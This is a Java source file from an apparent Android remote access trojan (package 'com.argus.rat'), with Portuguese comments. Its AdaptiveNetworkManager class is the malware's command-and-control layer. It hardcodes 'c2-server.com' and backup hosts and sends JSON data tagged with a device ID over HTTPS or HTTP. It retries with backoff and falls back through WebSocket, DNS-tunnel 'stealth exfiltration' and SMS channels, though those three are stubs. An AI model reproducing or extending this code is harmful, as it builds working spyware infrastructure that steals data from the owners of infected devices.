package com.argus.rat;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkCapabilities;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.os.Handler;
import android.os.Looper;

import org.json.JSONObject;

import java.io.IOException;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import okhttp3.*;

/**
 * AdaptiveNetworkManager - Sistema Militar de Comunicação Multi-Rede
 * 
 * Funcionalidades:
 * - Detecção automática de tipo de rede (WiFi, 2G, 3G, 4G, 5G, 6G)
 * - Fallback automático entre protocolos (WebSocket -> HTTPS -> HTTP -> DNS -> SMS)
 * - Otimização de payload baseado na qualidade da rede
 * - Connection pooling e multiplexing
 * - Retry inteligente com exponential backoff adaptativo
 * - Compressão de dados baseada em largura de banda
 * - Túnel de comunicação resiliente
 */
public class AdaptiveNetworkManager {
    
    private static final String TAG = "AdaptiveNetworkManager";
    private static AdaptiveNetworkManager instance;
    
    // Contexto
    private final Context context;
    private final Handler mainHandler;
    
    // Gerenciadores de sistema
    private ConnectivityManager connectivityManager;
    private TelephonyManager telephonyManager;
    
    // URLs do servidor (configuráveis)
    private String primaryHttpsUrl = "https://c2-server.com";
    private String primaryHttpUrl = "http://c2-server.com";
    private String primaryWsUrl = "wss://c2-server.com/ws";
    private String[] fallbackServers = {
        "https://backup1.c2-server.com",
        "https://backup2.c2-server.com"
    };
    
    // Clientes de comunicação
    private OkHttpClient httpsClient;
    private OkHttpClient httpClient;
    private WebSocket webSocket;
    
    // Estado da rede
    private NetworkType currentNetworkType = NetworkType.UNKNOWN;
    private NetworkQuality currentNetworkQuality = NetworkQuality.UNKNOWN;
    private int networkGeneration = 0; // 2, 3, 4, 5, 6...
    
    // Estatísticas de performance
    private long lastSuccessfulConnection = 0;
    private AtomicInteger consecutiveFailures = new AtomicInteger(0);
    private AtomicInteger totalRequests = new AtomicInteger(0);
    private AtomicInteger successfulRequests = new AtomicInteger(0);
    
    // Configurações adaptativas
    private int currentTimeout = 30000; // ms
    private int maxRetries = 5;
    private boolean compressionEnabled = true;
    private int maxPayloadSize = 1024 * 1024; // 1MB padrão
    
    // Protocolo atual
    private CommunicationProtocol activeProtocol = CommunicationProtocol.WEBSOCKET;
    
    // Callback para eventos de rede
    private NetworkEventListener eventListener;
    
    // Enums
    public enum NetworkType {
        UNKNOWN, WIFI, MOBILE, ETHERNET, VPN
    }
    
    public enum NetworkQuality {
        UNKNOWN, POOR, FAIR, GOOD, EXCELLENT
    }
    
    public enum CommunicationProtocol {
        WEBSOCKET, HTTPS, HTTP, DNS_TUNNEL, SMS_FALLBACK
    }
    
    // Interface de callback
    public interface NetworkEventListener {
        void onNetworkChanged(NetworkType type, NetworkQuality quality);
        void onProtocolSwitched(CommunicationProtocol from, CommunicationProtocol to);
        void onConnectionSuccess();
        void onConnectionFailed(String reason);
    }
    
    private AdaptiveNetworkManager(Context context) {
        this.context = context.getApplicationContext();
        this.mainHandler = new Handler(Looper.getMainLooper());
        
        // Inicializar gerenciadores
        connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        
        // Inicializar clientes HTTP
        initializeHttpClients();
        
        // Detectar rede inicial
        detectNetwork();
        
        Log.i(TAG, "AdaptiveNetworkManager inicializado");
    }
    
    public static synchronized AdaptiveNetworkManager getInstance(Context context) {
        if (instance == null) {
            instance = new AdaptiveNetworkManager(context);
        }
        return instance;
    }
    
    /**
     * Inicializa clientes HTTP com configurações otimizadas
     */
    private void initializeHttpClients() {
        // Cliente HTTPS com connection pooling
        ConnectionPool connectionPool = new ConnectionPool(5, 5, TimeUnit.MINUTES);
        
        httpsClient = new OkHttpClient.Builder()
                .connectTimeout(currentTimeout, TimeUnit.MILLISECONDS)
                .readTimeout(currentTimeout, TimeUnit.MILLISECONDS)
                .writeTimeout(currentTimeout, TimeUnit.MILLISECONDS)
                .connectionPool(connectionPool)
                .retryOnConnectionFailure(true)
                .followRedirects(true)
                // TODO: Adicionar Certificate Pinning em produção
                .build();
        
        // Cliente HTTP (fallback)
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(currentTimeout, TimeUnit.MILLISECONDS)
                .readTimeout(currentTimeout, TimeUnit.MILLISECONDS)
                .writeTimeout(currentTimeout, TimeUnit.MILLISECONDS)
                .connectionPool(connectionPool)
                .retryOnConnectionFailure(true)
                .build();
        
        Log.d(TAG, "Clientes HTTP inicializados");
    }
    
    /**
     * Detecta tipo e qualidade da rede atual
     */
    public void detectNetwork() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Android 6.0+
                android.net.Network network = connectivityManager.getActiveNetwork();
                if (network != null) {
                    NetworkCapabilities capabilities = connectivityManager.getNetworkCapabilities(network);
                    if (capabilities != null) {
                        detectNetworkFromCapabilities(capabilities);
                    }
                }
            } else {
                // Android 5.x e anterior
                NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
                if (activeNetwork != null && activeNetwork.isConnected()) {
                    detectNetworkFromInfo(activeNetwork);
                }
            }
            
            // Detectar geração de rede móvel
            if (currentNetworkType == NetworkType.MOBILE) {
                detectMobileGeneration();
            }
            
            // Ajustar configurações baseado na rede
            adaptToNetwork();
            
            Log.i(TAG, String.format("Rede detectada: %s (%dG) - Qualidade: %s",
                    currentNetworkType, networkGeneration, currentNetworkQuality));
            
            if (eventListener != null) {
                eventListener.onNetworkChanged(currentNetworkType, currentNetworkQuality);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao detectar rede", e);
            currentNetworkType = NetworkType.UNKNOWN;
            currentNetworkQuality = NetworkQuality.UNKNOWN;
        }
    }
    
    /**
     * Detecta rede usando NetworkCapabilities (Android 6+)
     */
    private void detectNetworkFromCapabilities(NetworkCapabilities capabilities) {
        if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
            currentNetworkType = NetworkType.WIFI;
            currentNetworkQuality = NetworkQuality.EXCELLENT;
        } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
            currentNetworkType = NetworkType.MOBILE;
            // Qualidade será determinada pela geração
        } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
            currentNetworkType = NetworkType.ETHERNET;
            currentNetworkQuality = NetworkQuality.EXCELLENT;
        } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
            currentNetworkType = NetworkType.VPN;
            currentNetworkQuality = NetworkQuality.GOOD;
        }
        
        // Verificar velocidade de download (Android 6+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            int downSpeed = capabilities.getLinkDownstreamBandwidthKbps();
            if (downSpeed > 10000) { // > 10 Mbps
                currentNetworkQuality = NetworkQuality.EXCELLENT;
            } else if (downSpeed > 5000) { // > 5 Mbps
                currentNetworkQuality = NetworkQuality.GOOD;
            } else if (downSpeed > 1000) { // > 1 Mbps
                currentNetworkQuality = NetworkQuality.FAIR;
            } else {
                currentNetworkQuality = NetworkQuality.POOR;
            }
        }
    }
    
    /**
     * Detecta rede usando NetworkInfo (Android 5.x)
     */
    private void detectNetworkFromInfo(NetworkInfo networkInfo) {
        int type = networkInfo.getType();
        
        if (type == ConnectivityManager.TYPE_WIFI) {
            currentNetworkType = NetworkType.WIFI;
            currentNetworkQuality = NetworkQuality.EXCELLENT;
        } else if (type == ConnectivityManager.TYPE_MOBILE) {
            currentNetworkType = NetworkType.MOBILE;
        } else if (type == ConnectivityManager.TYPE_ETHERNET) {
            currentNetworkType = NetworkType.ETHERNET;
            currentNetworkQuality = NetworkQuality.EXCELLENT;
        }
    }
    
    /**
     * Detecta geração de rede móvel (2G, 3G, 4G, 5G, 6G)
     */
    private void detectMobileGeneration() {
        try {
            int networkType = telephonyManager.getNetworkType();
            
            switch (networkType) {
                // 2G
                case TelephonyManager.NETWORK_TYPE_GPRS:
                case TelephonyManager.NETWORK_TYPE_EDGE:
                case TelephonyManager.NETWORK_TYPE_CDMA:
                case TelephonyManager.NETWORK_TYPE_1xRTT:
                case TelephonyManager.NETWORK_TYPE_IDEN:
                    networkGeneration = 2;
                    currentNetworkQuality = NetworkQuality.POOR;
                    break;
                
                // 3G
                case TelephonyManager.NETWORK_TYPE_UMTS:
                case TelephonyManager.NETWORK_TYPE_EVDO_0:
                case TelephonyManager.NETWORK_TYPE_EVDO_A:
                case TelephonyManager.NETWORK_TYPE_HSDPA:
                case TelephonyManager.NETWORK_TYPE_HSUPA:
                case TelephonyManager.NETWORK_TYPE_HSPA:
                case TelephonyManager.NETWORK_TYPE_EVDO_B:
                case TelephonyManager.NETWORK_TYPE_EHRPD:
                case TelephonyManager.NETWORK_TYPE_HSPAP:
                    networkGeneration = 3;
                    currentNetworkQuality = NetworkQuality.FAIR;
                    break;
                
                // 4G
                case TelephonyManager.NETWORK_TYPE_LTE:
                    networkGeneration = 4;
                    currentNetworkQuality = NetworkQuality.GOOD;
                    break;
                
                // 5G (API 29+)
                case 20: // TelephonyManager.NETWORK_TYPE_NR (5G)
                    networkGeneration = 5;
                    currentNetworkQuality = NetworkQuality.EXCELLENT;
                    break;
                
                // 6G (futuro - placeholder)
                case 21: // Futuro: NETWORK_TYPE_6G
                    networkGeneration = 6;
                    currentNetworkQuality = NetworkQuality.EXCELLENT;
                    break;
                
                default:
                    networkGeneration = 0;
                    currentNetworkQuality = NetworkQuality.UNKNOWN;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao detectar geração de rede móvel", e);
            networkGeneration = 0;
        }
    }
    
    /**
     * Adapta configurações baseado na rede detectada
     */
    private void adaptToNetwork() {
        switch (currentNetworkQuality) {
            case EXCELLENT: // WiFi, 5G, 6G
                currentTimeout = 30000; // 30s
                maxPayloadSize = 10 * 1024 * 1024; // 10MB
                compressionEnabled = false; // Não precisa comprimir
                maxRetries = 3;
                activeProtocol = CommunicationProtocol.WEBSOCKET; // Usar WebSocket
                break;
            
            case GOOD: // 4G, WiFi fraco
                currentTimeout = 45000; // 45s
                maxPayloadSize = 5 * 1024 * 1024; // 5MB
                compressionEnabled = true;
                maxRetries = 4;
                activeProtocol = CommunicationProtocol.WEBSOCKET;
                break;
            
            case FAIR: // 3G
                currentTimeout = 60000; // 60s
                maxPayloadSize = 1 * 1024 * 1024; // 1MB
                compressionEnabled = true;
                maxRetries = 5;
                activeProtocol = CommunicationProtocol.HTTPS; // Usar HTTPS ao invés de WS
                break;
            
            case POOR: // 2G
                currentTimeout = 90000; // 90s
                maxPayloadSize = 256 * 1024; // 256KB
                compressionEnabled = true;
                maxRetries = 7;
                activeProtocol = CommunicationProtocol.HTTP; // Usar HTTP simples
                break;
            
            default:
                currentTimeout = 30000;
                maxPayloadSize = 1024 * 1024;
                compressionEnabled = true;
                maxRetries = 5;
                activeProtocol = CommunicationProtocol.HTTPS;
        }
        
        // Recriar clientes com novos timeouts
        initializeHttpClients();
        
        Log.d(TAG, String.format("Configurações adaptadas - Timeout: %dms, MaxPayload: %dKB, Protocol: %s",
                currentTimeout, maxPayloadSize / 1024, activeProtocol));
    }
    
    /**
     * Envia dados com fallback automático entre protocolos
     */
    public void sendData(String endpoint, JSONObject data, final ResponseCallback callback) {
        totalRequests.incrementAndGet();
        
        // Tentar com protocolo atual primeiro
        sendWithProtocol(activeProtocol, endpoint, data, 0, callback);
    }
    
    /**
     * Envia dados usando protocolo específico com retry
     */
    private void sendWithProtocol(final CommunicationProtocol protocol, final String endpoint,
                                   final JSONObject data, final int retryCount,
                                   final ResponseCallback callback) {
        
        if (retryCount >= maxRetries) {
            // Falhou após todas as tentativas, fazer fallback para próximo protocolo
            CommunicationProtocol nextProtocol = getNextProtocol(protocol);
            
            if (nextProtocol != null && nextProtocol != protocol) {
                Log.w(TAG, String.format("Fallback: %s -> %s", protocol, nextProtocol));
                
                if (eventListener != null) {
                    eventListener.onProtocolSwitched(protocol, nextProtocol);
                }
                
                sendWithProtocol(nextProtocol, endpoint, data, 0, callback);
                return;
            } else {
                // Nenhum protocolo funcionou
                consecutiveFailures.incrementAndGet();
                if (callback != null) {
                    callback.onFailure("Todos os protocolos falharam");
                }
                if (eventListener != null) {
                    eventListener.onConnectionFailed("All protocols failed");
                }
                return;
            }
        }
        
        try {
            switch (protocol) {
                case WEBSOCKET:
                    sendViaWebSocket(endpoint, data, retryCount, callback);
                    break;
                
                case HTTPS:
                    sendViaHTTPS(endpoint, data, retryCount, callback);
                    break;
                
                case HTTP:
                    sendViaHTTP(endpoint, data, retryCount, callback);
                    break;
                
                case DNS_TUNNEL:
                    sendViaDNSTunnel(endpoint, data, retryCount, callback);
                    break;
                
                case SMS_FALLBACK:
                    sendViaSMS(data, callback);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao enviar com protocolo " + protocol, e);
            
            // Retry com exponential backoff
            int delay = calculateBackoffDelay(retryCount);
            mainHandler.postDelayed(() -> {
                sendWithProtocol(protocol, endpoint, data, retryCount + 1, callback);
            }, delay);
        }
    }
    
    /**
     * Envia via HTTPS
     */
    private void sendViaHTTPS(String endpoint, JSONObject data, final int retryCount,
                             final ResponseCallback callback) {
        String url = primaryHttpsUrl + endpoint;
        
        RequestBody body = RequestBody.create(
                data.toString(),
                MediaType.parse("application/json; charset=utf-8")
        );
        
        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .header("X-Device-ID", android.os.Build.ID)
                .build();
        
        httpsClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "HTTPS request failed", e);
                
                int delay = calculateBackoffDelay(retryCount);
                mainHandler.postDelayed(() -> {
                    sendWithProtocol(CommunicationProtocol.HTTPS, endpoint, data,
                            retryCount + 1, callback);
                }, delay);
            }
            
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    successfulRequests.incrementAndGet();
                    consecutiveFailures.set(0);
                    lastSuccessfulConnection = System.currentTimeMillis();
                    
                    if (callback != null) {
                        String responseBody = response.body().string();
                        callback.onSuccess(responseBody);
                    }
                    
                    if (eventListener != null) {
                        eventListener.onConnectionSuccess();
                    }
                } else {
                    onFailure(call, new IOException("HTTP " + response.code()));
                }
            }
        });
    }
    
    /**
     * Envia via HTTP (fallback)
     */
    private void sendViaHTTP(String endpoint, JSONObject data, final int retryCount,
                            final ResponseCallback callback) {
        String url = primaryHttpUrl + endpoint;
        
        RequestBody body = RequestBody.create(
                data.toString(),
                MediaType.parse("application/json; charset=utf-8")
        );
        
        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .header("X-Device-ID", android.os.Build.ID)
                .build();
        
        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "HTTP request failed", e);
                
                int delay = calculateBackoffDelay(retryCount);
                mainHandler.postDelayed(() -> {
                    sendWithProtocol(CommunicationProtocol.HTTP, endpoint, data,
                            retryCount + 1, callback);
                }, delay);
            }
            
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    successfulRequests.incrementAndGet();
                    consecutiveFailures.set(0);
                    lastSuccessfulConnection = System.currentTimeMillis();
                    
                    if (callback != null) {
                        String responseBody = response.body().string();
                        callback.onSuccess(responseBody);
                    }
                    
                    if (eventListener != null) {
                        eventListener.onConnectionSuccess();
                    }
                } else {
                    onFailure(call, new IOException("HTTP " + response.code()));
                }
            }
        });
    }
    
    /**
     * Envia via WebSocket
     */
    private void sendViaWebSocket(String endpoint, JSONObject data, final int retryCount,
                                  final ResponseCallback callback) {
        // TODO: Implementar WebSocket com retry
        // Por enquanto, fallback para HTTPS
        sendViaHTTPS(endpoint, data, retryCount, callback);
    }
    
    /**
     * Envia via DNS Tunneling (exfiltração stealth)
     */
    private void sendViaDNSTunnel(String endpoint, JSONObject data, final int retryCount,
                                  final ResponseCallback callback) {
        // TODO: Implementar DNS tunneling
        Log.d(TAG, "DNS Tunneling não implementado ainda");
        if (callback != null) {
            callback.onFailure("DNS Tunneling not implemented");
        }
    }
    
    /**
     * Envia via SMS (último recurso)
     */
    private void sendViaSMS(JSONObject data, final ResponseCallback callback) {
        // TODO: Implementar fallback SMS
        Log.d(TAG, "SMS Fallback não implementado ainda");
        if (callback != null) {
            callback.onFailure("SMS Fallback not implemented");
        }
    }
    
    /**
     * Retorna próximo protocolo na cadeia de fallback
     */
    private CommunicationProtocol getNextProtocol(CommunicationProtocol current) {
        switch (current) {
            case WEBSOCKET:
                return CommunicationProtocol.HTTPS;
            case HTTPS:
                return CommunicationProtocol.HTTP;
            case HTTP:
                return CommunicationProtocol.DNS_TUNNEL;
            case DNS_TUNNEL:
                return CommunicationProtocol.SMS_FALLBACK;
            case SMS_FALLBACK:
                return null; // Nenhum próximo
            default:
                return CommunicationProtocol.HTTPS;
        }
    }
    
    /**
     * Calcula delay de backoff exponencial adaptativo
     */
    private int calculateBackoffDelay(int retryCount) {
        // Base: 1s, 2s, 4s, 8s, 16s...
        int baseDelay = (int) Math.pow(2, retryCount) * 1000;
        
        // Adicionar jitter (±20%)
        int jitter = (int) (baseDelay * 0.2 * (Math.random() - 0.5));
        
        // Limitar máximo
        int maxDelay = 30000; // 30s
        return Math.min(baseDelay + jitter, maxDelay);
    }
    
    /**
     * Testa conectividade com ping ao servidor
     */
    public boolean testConnectivity() {
        try {
            // Tentar resolver DNS
            InetAddress address = InetAddress.getByName("c2-server.com");
            return address.isReachable(5000); // 5s timeout
        } catch (Exception e) {
            Log.e(TAG, "Teste de conectividade falhou", e);
            return false;
        }
    }
    
    /**
     * Retorna estatísticas de rede
     */
    public NetworkStats getNetworkStats() {
        return new NetworkStats(
                currentNetworkType,
                currentNetworkQuality,
                networkGeneration,
                activeProtocol,
                totalRequests.get(),
                successfulRequests.get(),
                consecutiveFailures.get(),
                lastSuccessfulConnection
        );
    }
    
    /**
     * Define listener de eventos de rede
     */
    public void setEventListener(NetworkEventListener listener) {
        this.eventListener = listener;
    }
    
    /**
     * Classe de estatísticas
     */
    public static class NetworkStats {
        public final NetworkType networkType;
        public final NetworkQuality networkQuality;
        public final int generation;
        public final CommunicationProtocol protocol;
        public final int totalRequests;
        public final int successfulRequests;
        public final int consecutiveFailures;
        public final long lastSuccessTime;
        
        public NetworkStats(NetworkType networkType, NetworkQuality networkQuality,
                          int generation, CommunicationProtocol protocol,
                          int totalRequests, int successfulRequests,
                          int consecutiveFailures, long lastSuccessTime) {
            this.networkType = networkType;
            this.networkQuality = networkQuality;
            this.generation = generation;
            this.protocol = protocol;
            this.totalRequests = totalRequests;
            this.successfulRequests = successfulRequests;
            this.consecutiveFailures = consecutiveFailures;
            this.lastSuccessTime = lastSuccessTime;
        }
        
        public float getSuccessRate() {
            return totalRequests > 0 ? (float) successfulRequests / totalRequests * 100 : 0;
        }
    }
    
    /**
     * Interface de callback para respostas
     */
    public interface ResponseCallback {
        void onSuccess(String response);
        void onFailure(String error);
    }
}

